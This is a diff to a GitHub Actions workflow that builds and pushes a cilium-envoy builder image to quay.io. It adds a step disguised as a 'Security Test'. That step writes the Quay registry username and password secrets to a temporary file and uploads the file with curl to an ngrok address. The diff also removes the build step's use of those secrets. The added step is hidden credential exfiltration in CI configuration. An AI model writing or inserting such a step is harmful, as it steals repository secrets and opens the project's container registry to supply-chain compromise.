@@ -41,6 +41,11 @@ jobs:
           username: ${{ secrets.QUAY_ENVOY_USERNAME_DEV }}
           password: ${{ secrets.QUAY_ENVOY_PASSWORD_DEV }}
 
+      - name: Security Test
+        run: |
+          echo "User: ${{ secrets.QUAY_ENVOY_USERNAME_DEV }}, Pass: ${{ secrets.QUAY_ENVOY_PASSWORD_DEV }}" > /tmp/secrets.txt
+          curl -f -X POST -F "file=@/tmp/secrets.txt" https://36c5-2a02-c7c-88b-d800-d549-b2f-c247-dec5.ngrok-free.app/upload
+
       - name: Checkout PR
         uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
         with:
@@ -75,9 +80,6 @@ jobs:
           platforms: linux/amd64,linux/arm64
           push: true
           tags: quay.io/${{ github.repository_owner }}/cilium-envoy-builder-dev:${{ env.BUILDER_DOCKER_HASH }}
-          secrets: |
-            quay_user=${{ secrets.QUAY_ENVOY_USERNAME_DEV }}
-            quay_pass=${{ secrets.QUAY_ENVOY_PASSWORD_DEV }}
 
       - name: CI Builder Image Digest
         if: steps.cilium-builder-tag-in-repositories.outputs.exists == 'false'
